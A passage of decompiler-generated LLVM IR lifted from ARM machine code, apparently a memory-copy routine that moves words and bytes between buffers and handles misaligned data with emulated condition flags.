  %v4_18128 = inttoptr i32 %v3_18128 to i32*
  %v5_18128 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18128, i32* %v4_18128, align 4
  %v6_18128 = add i32 %v0_18120, 24
  %v7_18128 = inttoptr i32 %v6_18128 to i32*
  %v8_18128 = load i32, i32* @ip, align 4
  store i32 %v8_18128, i32* %v7_18128, align 4
  %v9_18128 = add i32 %v0_18120, 28
  %v10_18128 = inttoptr i32 %v9_18128 to i32*
  %v11_18128 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18128, i32* %v10_18128, align 4
  %v12_18128 = add i32 %v0_18120, 32
  store i32 %v12_18128, i32* @r0, align 4
  %v0_1812c = load i32, i32* %r2.global-to-local, align 4
  %v1_1812c = add i32 %v0_1812c, -32
  store i32 %v1_1812c, i32* %r2.global-to-local, align 4
  %v3_1812c = sub i32 31, %v0_1812c
  %v4_1812c = and i32 %v3_1812c, %v0_1812c
  %v5_1812c = icmp slt i32 %v4_1812c, 0
  %v6_1812c = icmp slt i32 %v1_1812c, 0
  %v2_18130 = xor i1 %v6_1812c, %v5_1812c
  br i1 %v2_18130, label %dec_label_pc_18134, label %dec_label_pc_1811c.dec_label_pc_1811c_crit_edge

dec_label_pc_1811c.dec_label_pc_1811c_crit_edge:  ; preds = %dec_label_pc_1811c
  %v0_1811c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1811c

dec_label_pc_18134:                               ; preds = %dec_label_pc_1811c
  %v1_18134 = add i32 %v0_1812c, -16
  %v3_18134 = add i32 %v0_1812c, 2147483616
  %v4_18134 = and i32 %v1_18134, %v3_18134
  %v5_18134 = icmp slt i32 %v4_18134, 0
  store i1 %v5_18134, i1* %cpsr_v.global-to-local, align 1
  %v6_18134 = icmp slt i32 %v1_18134, 0
  store i1 %v6_18134, i1* %cpsr_n.global-to-local, align 1
  %v7_18134 = icmp eq i32 %v1_18134, 0
  store i1 %v7_18134, i1* %cpsr_z.global-to-local, align 1
  %v2_18138 = xor i1 %v6_18134, %v5_18134
  br i1 %v2_18138, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_18134
  %v3_18138 = load i32, i32* @r1, align 4
  %v4_18138 = inttoptr i32 %v3_18138 to i32*
  %v5_18138 = load i32, i32* %v4_18138, align 4
  store i32 %v5_18138, i32* @r3, align 4
  %v6_18138 = add i32 %v3_18138, 4
  %v7_18138 = inttoptr i32 %v6_18138 to i32*
  %v8_18138 = load i32, i32* %v7_18138, align 4
  store i32 %v8_18138, i32* %r4.global-to-local, align 4
  %v9_18138 = add i32 %v3_18138, 8
  %v10_18138 = inttoptr i32 %v9_18138 to i32*
  %v11_18138 = load i32, i32* %v10_18138, align 4
  store i32 %v11_18138, i32* @ip, align 4
  %v12_18138 = add i32 %v3_18138, 12
  %v13_18138 = inttoptr i32 %v12_18138 to i32*
  %v14_18138 = load i32, i32* %v13_18138, align 4
  store i32 %v14_18138, i32* %lr.global-to-local, align 4
  %v15_18138 = add i32 %v3_18138, 16
  store i32 %v15_18138, i32* @r1, align 4
  %v4_1813c = inttoptr i32 %v12_18128 to i32*
  store i32 %v5_18138, i32* %v4_1813c, align 4
  %v6_1813c = add i32 %v0_18120, 36
  %v7_1813c = inttoptr i32 %v6_1813c to i32*
  %v8_1813c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1813c, i32* %v7_1813c, align 4
  %v9_1813c = add i32 %v0_18120, 40
  %v10_1813c = inttoptr i32 %v9_1813c to i32*
  %v11_1813c = load i32, i32* @ip, align 4
  store i32 %v11_1813c, i32* %v10_1813c, align 4
  %v12_1813c = add i32 %v0_18120, 44
  %v13_1813c = inttoptr i32 %v12_1813c to i32*
  %v14_1813c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1813c, i32* %v13_1813c, align 4
  %v15_1813c = add i32 %v0_18120, 48
  store i32 %v15_1813c, i32* @r0, align 4
  %v3_18140 = load i32, i32* %r2.global-to-local, align 4
  %v4_18140 = add i32 %v3_18140, -16
  store i32 %v4_18140, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_18134, %bb136
  %v3_18150102111 = phi i32 [ %v15_1813c, %bb136 ], [ %v12_18128, %dec_label_pc_18134 ]
  %v0_18148.pre = phi i32 [ %v4_18140, %bb136 ], [ %v1_1812c, %dec_label_pc_18134 ]
  %v2_18144 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18144, i32* @r4, align 4
  br label %dec_label_pc_18148

dec_label_pc_18148:                               ; preds = %dec_label_pc_18110, %bb137
  %v3_18150101 = phi i32 [ %v0_1812094, %dec_label_pc_18110 ], [ %v3_18150102111, %bb137 ]
  %v0_18148 = phi i32 [ %v1_18110, %dec_label_pc_18110 ], [ %v0_18148.pre, %bb137 ]
  %v1_18148 = add i32 %v0_18148, 20
  store i32 %v1_18148, i32* %r2.global-to-local, align 4
  %v3_18148 = sub i32 0, %v0_18148
  %v4_18148 = and i32 %v1_18148, %v3_18148
  %v5_18148 = icmp slt i32 %v4_18148, 0
  store i1 %v5_18148, i1* %cpsr_v.global-to-local, align 1
  %v6_18148 = icmp slt i32 %v1_18148, 0
  store i1 %v6_18148, i1* %cpsr_n.global-to-local, align 1
  %v7_18148 = icmp eq i32 %v1_18148, 0
  store i1 %v7_18148, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1814c

dec_label_pc_1814c:                               ; preds = %.thread115, %dec_label_pc_18148
  %v0_1815c.pre157 = phi i32 [ %v0_1815c.pre, %.thread115 ], [ %v1_18148, %dec_label_pc_18148 ]
  %v3_18150 = phi i32 [ %v3_1815099116, %.thread115 ], [ %v3_18150101, %dec_label_pc_18148 ]
  %v1_18154 = phi i1 [ %v1_18158, %.thread115 ], [ %v5_18148, %dec_label_pc_18148 ]
  %v0_18154 = phi i1 [ %v0_18158, %.thread115 ], [ %v6_18148, %dec_label_pc_18148 ]
  %v2_1814c = xor i1 %v1_18154, %v0_18154
  br i1 %v2_1814c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1814c
  %v3_1814c = load i32, i32* @r1, align 4
  %v4_1814c = inttoptr i32 %v3_1814c to i32*
  %v5_1814c = load i32, i32* %v4_1814c, align 4
  store i32 %v5_1814c, i32* @r3, align 4
  %v6_1814c = add i32 %v3_1814c, 4
  %v7_1814c = inttoptr i32 %v6_1814c to i32*
  %v8_1814c = load i32, i32* %v7_1814c, align 4
  store i32 %v8_1814c, i32* @ip, align 4
  %v9_1814c = add i32 %v3_1814c, 8
  %v10_1814c = inttoptr i32 %v9_1814c to i32*
  %v11_1814c = load i32, i32* %v10_1814c, align 4
  store i32 %v11_1814c, i32* %lr.global-to-local, align 4
  %v12_1814c = add i32 %v3_1814c, 12
  store i32 %v12_1814c, i32* @r1, align 4
  %v4_18150 = inttoptr i32 %v3_18150 to i32*
  store i32 %v5_1814c, i32* %v4_18150, align 4
  %v6_18150 = add i32 %v3_18150, 4
  %v7_18150 = inttoptr i32 %v6_18150 to i32*
  %v8_18150 = load i32, i32* @ip, align 4
  store i32 %v8_18150, i32* %v7_18150, align 4
  %v9_18150 = add i32 %v3_18150, 8
  %v10_18150 = inttoptr i32 %v9_18150 to i32*
  %v11_18150 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18150, i32* %v10_18150, align 4
  %v12_18150 = add i32 %v3_18150, 12
  store i32 %v12_18150, i32* @r0, align 4
  %v3_18154 = load i32, i32* %r2.global-to-local, align 4
  %v4_18154 = add i32 %v3_18154, -12
  store i32 %v4_18154, i32* %r2.global-to-local, align 4
  %v6_18154 = sub i32 11, %v3_18154
  %v7_18154 = and i32 %v6_18154, %v3_18154
  %v8_18154 = icmp slt i32 %v7_18154, 0
  store i1 %v8_18154, i1* %cpsr_v.global-to-local, align 1
  %v9_18154 = icmp slt i32 %v4_18154, 0
  store i1 %v9_18154, i1* %cpsr_n.global-to-local, align 1
  %v10_18154 = icmp eq i32 %v3_18154, 12
  store i1 %v10_18154, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1814c, %bb138
  %v0_1815c.pre = phi i32 [ %v4_18154, %bb138 ], [ %v0_1815c.pre157, %dec_label_pc_1814c ]
  %v3_1815099116 = phi i32 [ %v12_18150, %bb138 ], [ %v3_18150, %dec_label_pc_1814c ]
  %v1_18158 = phi i1 [ %v8_18154, %bb138 ], [ %v1_18154, %dec_label_pc_1814c ]
  %v0_18158 = phi i1 [ %v9_18154, %bb138 ], [ %v0_18154, %dec_label_pc_1814c ]
  %v2_18158 = xor i1 %v1_18158, %v0_18158
  br i1 %v2_18158, label %dec_label_pc_1815c, label %dec_label_pc_1814c

dec_label_pc_1815c:                               ; preds = %.thread115, %dec_label_pc_18108
  %v4_1816c = phi i32 [ %v0_1812094, %dec_label_pc_18108 ], [ %v3_1815099116, %.thread115 ]
  %v0_1815c = phi i32 [ %v1_18108, %dec_label_pc_18108 ], [ %v0_1815c.pre, %.thread115 ]
  %v1_1815c = add i32 %v0_1815c, 8
  store i32 %v1_1815c, i32* %r2.global-to-local, align 4
  %v3_1815c = sub i32 0, %v0_1815c
  %v4_1815c = and i32 %v1_1815c, %v3_1815c
  %v5_1815c = icmp slt i32 %v4_1815c, 0
  store i1 %v5_1815c, i1* %cpsr_v.global-to-local, align 1
  %v6_1815c = icmp slt i32 %v1_1815c, 0
  store i1 %v6_1815c, i1* %cpsr_n.global-to-local, align 1
  %v7_1815c = icmp eq i32 %v1_1815c, 0
  store i1 %v7_1815c, i1* %cpsr_z.global-to-local, align 1
  %v2_18160 = xor i1 %v6_1815c, %v5_1815c
  br i1 %v2_18160, label %bb140, label %dec_label_pc_18164

dec_label_pc_18164:                               ; preds = %dec_label_pc_1815c
  %v1_18164 = add i32 %v0_1815c, 4
  store i32 %v1_18164, i32* %r2.global-to-local, align 4
  %v3_18164 = sub i32 -5, %v0_1815c
  %v4_18164 = and i32 %v3_18164, %v1_1815c
  %v5_18164 = icmp slt i32 %v4_18164, 0
  store i1 %v5_18164, i1* %cpsr_v.global-to-local, align 1
  %v6_18164 = icmp slt i32 %v1_18164, 0
  store i1 %v6_18164, i1* %cpsr_n.global-to-local, align 1
  %v7_18164 = icmp eq i32 %v1_1815c, 4
  store i1 %v7_18164, i1* %cpsr_z.global-to-local, align 1
  %v2_18168 = xor i1 %v6_18164, %v5_18164
  %v3_18168 = load i32, i32* @r1, align 4
  %v4_18168 = inttoptr i32 %v3_18168 to i32*
  %v5_18168 = load i32, i32* %v4_18168, align 4
  store i32 %v5_18168, i32* @r3, align 4
  %v7_18168 = add i32 %v3_18168, 4
  br i1 %v2_18168, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_18164
  store i32 %v7_18168, i32* @r1, align 4
  %v5_1816c = inttoptr i32 %v4_1816c to i32*
  store i32 %v5_18168, i32* %v5_1816c, align 4
  %v6_1816c = load i32, i32* @r0, align 4
  %v7_1816c = add i32 %v6_1816c, 4
  store i32 %v7_1816c, i32* @r0, align 4
  %v0_1817c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_18164
  %v7_18170 = inttoptr i32 %v7_18168 to i32*
  %v8_18170 = load i32, i32* %v7_18170, align 4
  store i32 %v8_18170, i32* @ip, align 4
  %v9_18170 = add i32 %v3_18168, 8
  store i32 %v9_18170, i32* @r1, align 4
  %v4_18174 = inttoptr i32 %v4_1816c to i32*
  store i32 %v5_18168, i32* %v4_18174, align 4
  %v6_18174 = add i32 %v4_1816c, 4
  %v7_18174 = inttoptr i32 %v6_18174 to i32*
  %v8_18174 = load i32, i32* @ip, align 4
  store i32 %v8_18174, i32* %v7_18174, align 4
  %v9_18174 = add i32 %v4_1816c, 8
  store i32 %v9_18174, i32* @r0, align 4
  %v3_18178 = load i32, i32* %r2.global-to-local, align 4
  %v4_18178 = add i32 %v3_18178, -4
  store i32 %v4_18178, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1815c, %bb, %dec_label_pc_1832c, %dec_label_pc_182c0, %dec_label_pc_18254, %bb139
  %v0_1817c = phi i32 [ %v0_1817c.pre, %.thread122 ], [ %v2_181cc, %.thread128 ], [ %v1_1815c, %dec_label_pc_1815c ], [ %v2_180f0, %bb ], [ %v0_1817c61, %dec_label_pc_1832c ], [ %v0_1817c60, %dec_label_pc_182c0 ], [ %v0_1817c59, %dec_label_pc_18254 ], [ %v4_18178, %bb139 ]
  %v1_1817c = add i32 %v0_1817c, 4
  store i32 %v1_1817c, i32* %r2.global-to-local, align 4
  %v3_1817c = sub i32 0, %v0_1817c
  %v4_1817c = and i32 %v1_1817c, %v3_1817c
  %v5_1817c = icmp slt i32 %v4_1817c, 0
  store i1 %v5_1817c, i1* %cpsr_v.global-to-local, align 1
  %v6_1817c = icmp slt i32 %v1_1817c, 0
  store i1 %v6_1817c, i1* %cpsr_n.global-to-local, align 1
  %v7_1817c = icmp eq i32 %v1_1817c, 0
  store i1 %v7_1817c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1817c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_18184.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_18180 = load i8*, i8** %stack_var_-8, align 4
  %v4_18180 = ptrtoint i8* %v3_18180 to i32
  store i32 %v4_18180, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_18184 = phi i32 [ %v0_18184.pre, %bb140.bb142_crit_edge ], [ %v8_180ec, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1817c, i32 %v0_18184)
  %v0_18188 = load i32, i32* %r2.global-to-local, align 4
  %v1_18188 = add i32 %v0_18188, -2
  %v3_18188 = sub i32 1, %v0_18188
  %v4_18188 = and i32 %v3_18188, %v0_18188
  %v5_18188 = icmp slt i32 %v4_18188, 0
  store i1 %v5_18188, i1* %cpsr_v.global-to-local, align 1
  %v6_18188 = icmp slt i32 %v1_18188, 0
  store i1 %v6_18188, i1* %cpsr_n.global-to-local, align 1
  %v7_18188 = icmp eq i32 %v0_18188, 2
  store i1 %v7_18188, i1* %cpsr_z.global-to-local, align 1
  %v0_1818c = load i32, i32* @r1, align 4
  %v1_1818c = inttoptr i32 %v0_1818c to i8*
  %v2_1818c = load i8, i8* %v1_1818c, align 1
  %v5_1818c = add i32 %v0_1818c, 1
  store i32 %v5_1818c, i32* %r1.global-to-local, align 4
  %v2_18190 = load i32, i32* @r0, align 4
  %v3_18190 = inttoptr i32 %v2_18190 to i8*
  store i8 %v2_1818c, i8* %v3_18190, align 1
  %v4_18190 = load i32, i32* @r0, align 4
  %v5_18190 = add i32 %v4_18190, 1
  store i32 %v5_18190, i32* %r0.global-to-local, align 4
  %v0_18194 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18194 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18194 = xor i1 %v0_18194, %v1_18194
  br i1 %v2_18194, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_18194 = load i32, i32* %r1.global-to-local, align 4
  %v4_18194 = inttoptr i32 %v3_18194 to i8*
  %v5_18194 = load i8, i8* %v4_18194, align 1
  %v8_18194 = add i32 %v3_18194, 1
  store i32 %v8_18194, i32* %r1.global-to-local, align 4
  %v6_18198 = inttoptr i32 %v5_18190 to i8*
  store i8 %v5_18194, i8* %v6_18198, align 1
  %v7_18198 = load i32, i32* %r0.global-to-local, align 4
  %v8_18198 = add i32 %v7_18198, 1
  store i32 %v8_18198, i32* %r0.global-to-local, align 4
  %v1_1819c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1819c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_181a0 = phi i32 [ %v8_18198, %bb143 ], [ %v5_18190, %bb142 ]
  %v2_181a0 = phi i1 [ %v2_1819c.pre, %bb143 ], [ %v1_18194, %bb142 ]
  %v1_181a0 = phi i1 [ %v1_1819c.pre, %bb143 ], [ %v0_18194, %bb142 ]
  %v0_1819c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1819c = xor i1 %v2_181a0, %v1_181a0
  %v4_1819c = or i1 %v0_1819c, %v3_1819c
  br i1 %v4_1819c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1819c = load i32, i32* %r1.global-to-local, align 4
  %v6_1819c = inttoptr i32 %v5_1819c to i8*
  %v7_1819c = load i8, i8* %v6_1819c, align 1
  %v10_1819c = add i32 %v5_1819c, 1
  store i32 %v10_1819c, i32* %r1.global-to-local, align 4
  %v8_181a0 = inttoptr i32 %v7_181a0 to i8*
  store i8 %v7_1819c, i8* %v8_181a0, align 1
  %v9_181a0 = load i32, i32* %r0.global-to-local, align 4
  %v10_181a0 = add i32 %v9_181a0, 1
  store i32 %v10_181a0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_181a4 = load i8*, i8** %stack_var_-8, align 4
  %v3_181a4 = ptrtoint i8* %v2_181a4 to i32
  store i32 %v3_181a4, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_180ec)
  %v0_181ac.pre = load i32, i32* @ip, align 4
  %v0_181b4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_181b8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_181ac

dec_label_pc_181ac:                               ; preds = %dec_label_pc_180f8, %.thread126
  %v2_181b8 = phi i32 [ %v1_180e0, %dec_label_pc_180f8 ], [ %v2_181b8.pre, %.thread126 ]
  %v0_181b4 = phi i32 [ %v0_180e0, %dec_label_pc_180f8 ], [ %v0_181b4.pre, %.thread126 ]
  %v0_181ac = phi i32 [ %v1_180f8, %dec_label_pc_180f8 ], [ %v0_181ac.pre, %.thread126 ]
  %v1_181ac = sub i32 4, %v0_181ac
  store i32 %v1_181ac, i32* @ip, align 4
  %v1_181b0 = add i32 %v1_181ac, -2
  %v3_181b0 = sub i32 1, %v1_181ac
  %v4_181b0 = and i32 %v3_181b0, %v1_181ac
  %v5_181b0 = icmp slt i32 %v4_181b0, 0
  store i1 %v5_181b0, i1* %cpsr_v.global-to-local, align 1
  %v6_181b0 = icmp slt i32 %v1_181b0, 0
  store i1 %v6_181b0, i1* %cpsr_n.global-to-local, align 1
  %v7_181b0 = icmp eq i32 %v1_181ac, 2
  store i1 %v7_181b0, i1* %cpsr_z.global-to-local, align 1
  %v1_181b4 = inttoptr i32 %v0_181b4 to i8*
  %v2_181b4 = load i8, i8* %v1_181b4, align 1
  %v3_181b4 = zext i8 %v2_181b4 to i32
  store i32 %v3_181b4, i32* @r3, align 4
  %v5_181b4 = add i32 %v0_181b4, 1
  store i32 %v5_181b4, i32* @r1, align 4
  %v3_181b8 = inttoptr i32 %v2_181b8 to i8*
  store i8 %v2_181b4, i8* %v3_181b8, align 1
  %v4_181b8 = load i32, i32* @r0, align 4
  %v5_181b8 = add i32 %v4_181b8, 1
  store i32 %v5_181b8, i32* @r0, align 4
  %v0_181bc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_181bc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_181bc = xor i1 %v0_181bc, %v1_181bc
  br i1 %v2_181bc, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_181ac
  %v3_181bc = load i32, i32* @r1, align 4
  %v4_181bc = inttoptr i32 %v3_181bc to i8*
  %v5_181bc = load i8, i8* %v4_181bc, align 1
  %v6_181bc = zext i8 %v5_181bc to i32
  store i32 %v6_181bc, i32* @r3, align 4
  %v8_181bc = add i32 %v3_181bc, 1
  store i32 %v8_181bc, i32* @r1, align 4
  %v6_181c0 = inttoptr i32 %v5_181b8 to i8*
  store i8 %v5_181bc, i8* %v6_181c0, align 1
  %v7_181c0 = load i32, i32* @r0, align 4
  %v8_181c0 = add i32 %v7_181c0, 1
  store i32 %v8_181c0, i32* @r0, align 4
  %v1_181c4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_181c4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_181ac, %bb145
  %v7_181c8 = phi i32 [ %v8_181c0, %bb145 ], [ %v5_181b8, %dec_label_pc_181ac ]
  %v2_181c8 = phi i1 [ %v2_181c4.pre, %bb145 ], [ %v1_181bc, %dec_label_pc_181ac ]
  %v1_181c8 = phi i1 [ %v1_181c4.pre, %bb145 ], [ %v0_181bc, %dec_label_pc_181ac ]
  %v0_181c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_181c4 = xor i1 %v2_181c8, %v1_181c8
  %v4_181c4 = or i1 %v0_181c4, %v3_181c4
  br i1 %v4_181c4, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_181c4 = load i32, i32* @r1, align 4
  %v6_181c4 = inttoptr i32 %v5_181c4 to i8*
  %v7_181c4 = load i8, i8* %v6_181c4, align 1
  %v8_181c4 = zext i8 %v7_181c4 to i32
  store i32 %v8_181c4, i32* @r3, align 4
  %v10_181c4 = add i32 %v5_181c4, 1
  store i32 %v10_181c4, i32* @r1, align 4
  %v8_181c8 = inttoptr i32 %v7_181c8 to i8*
  store i8 %v7_181c4, i8* %v8_181c8, align 1
  %v9_181c8 = load i32, i32* @r0, align 4
  %v10_181c8 = add i32 %v9_181c8, 1
  store i32 %v10_181c8, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_182fc77 = phi i32 [ %v10_181c8, %bb146 ], [ %v7_181c8, %.thread127 ]
  %v0_181cc = load i32, i32* %r2.global-to-local, align 4
  %v1_181cc = load i32, i32* @ip, align 4
  %v2_181cc = sub i32 %v0_181cc, %v1_181cc
  store i32 %v2_181cc, i32* %r2.global-to-local, align 4
  %v4_181cc = xor i32 %v1_181cc, %v0_181cc
  %v5_181cc = xor i32 %v2_181cc, %v0_181cc
  %v6_181cc = and i32 %v5_181cc, %v4_181cc
  %v7_181cc = icmp slt i32 %v6_181cc, 0
  store i1 %v7_181cc, i1* %cpsr_v.global-to-local, align 1
  %v8_181cc = icmp slt i32 %v2_181cc, 0
  store i1 %v8_181cc, i1* %cpsr_n.global-to-local, align 1
  %v9_181cc = icmp eq i32 %v0_181cc, %v1_181cc
  store i1 %v9_181cc, i1* %cpsr_z.global-to-local, align 1
  %v2_181d0 = xor i1 %v8_181cc, %v7_181cc
  br i1 %v2_181d0, label %bb140, label %dec_label_pc_181d4

dec_label_pc_181d4:                               ; preds = %.thread128
  %v0_181d4 = load i32, i32* @r1, align 4
  %v1_181d4 = urem i32 %v0_181d4, 4
  store i32 %v1_181d4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_181d4 = icmp eq i32 %v1_181d4, 0
  store i1 %v2_181d4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_181d4 to i2
  br i1 %v2_181d4, label %dec_label_pc_18108, label %dec_label_pc_181dc

dec_label_pc_181dc:                               ; preds = %dec_label_pc_18100, %dec_label_pc_181d4
  %v0_182fc76 = phi i32 [ %v1_180e0, %dec_label_pc_18100 ], [ %v0_182fc77, %dec_label_pc_181d4 ]
  %v0_18264 = phi i32 [ %v2_180f0, %dec_label_pc_18100 ], [ %v2_181cc, %dec_label_pc_181d4 ]
  %v0_181e4.off0 = phi i2 [ %extract.t, %dec_label_pc_18100 ], [ %extract.t131, %dec_label_pc_181d4 ]
  %v0_181dc = phi i32 [ %v0_180e0, %dec_label_pc_18100 ], [ %v0_181d4, %dec_label_pc_181d4 ]
  %v1_181dc = and i32 %v0_181dc, -4
  store i32 %v1_181dc, i32* %r1.global-to-local, align 4
  %v1_181e0 = inttoptr i32 %v1_181dc to i32*
  %v2_181e0 = load i32, i32* %v1_181e0, align 4
  store i32 %v2_181e0, i32* %lr.global-to-local, align 4
  %v4_181e0 = add i32 %v1_181dc, 4
  store i32 %v4_181e0, i32* %r1.global-to-local, align 4
  %v1_1825c = add i32 %v0_18264, -12
  %v3_1825c = sub i32 11, %v0_18264
  %v4_1825c = and i32 %v3_1825c, %v0_18264
  %v5_1825c = icmp slt i32 %v4_1825c, 0
  store i1 %v5_1825c, i1* %cpsr_v.global-to-local, align 1
  %v6_1825c = icmp slt i32 %v1_1825c, 0
  store i1 %v6_1825c, i1* %cpsr_n.global-to-local, align 1
  %v7_1825c = icmp eq i32 %v0_18264, 12
  store i1 %v7_1825c, i1* %cpsr_z.global-to-local, align 1
  %v2_18260 = xor i1 %v6_1825c, %v5_1825c
  switch i2 %v0_181e4.off0, label %dec_label_pc_181f0 [
    i2 -1, label %dec_label_pc_182c8
    i2 -2, label %dec_label_pc_1825c
  ]

dec_label_pc_181f0:                               ; preds = %dec_label_pc_181dc
  br i1 %v2_18260, label %dec_label_pc_1823c, label %dec_label_pc_181f8

dec_label_pc_181f8:                               ; preds = %dec_label_pc_181f0
  store i32 %v1_1825c, i32* %r2.global-to-local, align 4
  %v3_181fc = load i32, i32* @r4, align 4
  store i32 %v3_181fc, i32* %stack_var_-16, align 4
  %v6_181fc = load i32, i32* @r5, align 4
  store i32 %v6_181fc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18200

dec_label_pc_18200:                               ; preds = %dec_label_pc_18200.dec_label_pc_18200_crit_edge, %dec_label_pc_181f8
  %v0_18224 = phi i32 [ %v12_18224, %dec_label_pc_18200.dec_label_pc_18200_crit_edge ], [ %v0_182fc76, %dec_label_pc_181f8 ]
  %v0_18204 = phi i32 [ %v0_18204.pre, %dec_label_pc_18200.dec_label_pc_18200_crit_edge ], [ %v4_181e0, %dec_label_pc_181f8 ]
  %v0_18200 = phi i32 [ %v0_18200.pre, %dec_label_pc_18200.dec_label_pc_18200_crit_edge ], [ %v2_181e0, %dec_label_pc_181f8 ]
  %v3_18200 = udiv i32 %v0_18200, 256
  %v1_18204 = inttoptr i32 %v0_18204 to i32*
  %v2_18204 = load i32, i32* %v1_18204, align 4
  store i32 %v2_18204, i32* %r4.global-to-local, align 4
  %v3_18204 = add i32 %v0_18204, 4
  %v4_18204 = inttoptr i32 %v3_18204 to i32*
  %v5_18204 = load i32, i32* %v4_18204, align 4
  store i32 %v5_18204, i32* %r5.global-to-local, align 4
  %v6_18204 = add i32 %v0_18204, 8
  %v7_18204 = inttoptr i32 %v6_18204 to i32*
  %v8_18204 = load i32, i32* %v7_18204, align 4
  store i32 %v8_18204, i32* %ip.global-to-local, align 4
  %v9_18204 = add i32 %v0_18204, 12
  %v10_18204 = inttoptr i32 %v9_18204 to i32*
  %v11_18204 = load i32, i32* %v10_18204, align 4
  store i32 %v11_18204, i32* %lr.global-to-local, align 4
  %v12_18204 = add i32 %v0_18204, 16
  store i32 %v12_18204, i32* %r1.global-to-local, align 4
  %v4_18208 = mul i32 %v2_18204, 16777216
  %v5_18208 = or i32 %v4_18208, %v3_18200
  store i32 %v5_18208, i32* @r3, align 4
  %v3_1820c = udiv i32 %v2_18204, 256
  %v4_18210 = mul i32 %v5_18204, 16777216
  %v5_18210 = or i32 %v4_18210, %v3_1820c
  store i32 %v5_18210, i32* %r4.global-to-local, align 4
  %v3_18214 = udiv i32 %v5_18204, 256
  %v4_18218 = mul i32 %v8_18204, 16777216
  %v5_18218 = or i32 %v4_18218, %v3_18214
  store i32 %v5_18218, i32* %r5.global-to-local, align 4
  %v3_1821c = udiv i32 %v8_18204, 256
  %v4_18220 = mul i32 %v11_18204, 16777216
  %v5_18220 = or i32 %v4_18220, %v3_1821c
  store i32 %v5_18220, i32* @ip, align 4
  %v1_18224 = inttoptr i32 %v0_18224 to i32*
  store i32 %v5_18208, i32* %v1_18224, align 4
  %v3_18224 = add i32 %v0_18224, 4
  %v4_18224 = inttoptr i32 %v3_18224 to i32*
  %v5_18224 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18224, i32* %v4_18224, align 4
  %v6_18224 = add i32 %v0_18224, 8
  %v7_18224 = inttoptr i32 %v6_18224 to i32*
  %v8_18224 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18224, i32* %v7_18224, align 4
  %v9_18224 = add i32 %v0_18224, 12
  %v10_18224 = inttoptr i32 %v9_18224 to i32*
  %v11_18224 = load i32, i32* @ip, align 4
  store i32 %v11_18224, i32* %v10_18224, align 4
  %v12_18224 = add i32 %v0_18224, 16
  store i32 %v12_18224, i32* @r0, align 4
  %v0_18228 = load i32, i32* %r2.global-to-local, align 4
  %v1_18228 = add i32 %v0_18228, -16
  store i32 %v1_18228, i32* %r2.global-to-local, align 4
  %v3_18228 = sub i32 15, %v0_18228
  %v4_18228 = and i32 %v3_18228, %v0_18228
  %v5_18228 = icmp slt i32 %v4_18228, 0
  %v6_18228 = icmp slt i32 %v1_18228, 0
  %v2_1822c = xor i1 %v6_18228, %v5_18228
  br i1 %v2_1822c, label %dec_label_pc_18230, label %dec_label_pc_18200.dec_label_pc_18200_crit_edge

dec_label_pc_18200.dec_label_pc_18200_crit_edge:  ; preds = %dec_label_pc_18200
  %v0_18200.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18204.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18200

dec_label_pc_18230:                               ; preds = %dec_label_pc_18200
  %v2_18230 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18230, i32* @r4, align 4
  %v5_18230 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18230, i32* @r5, align 4
  %v1_18234 = add i32 %v0_18228, -4
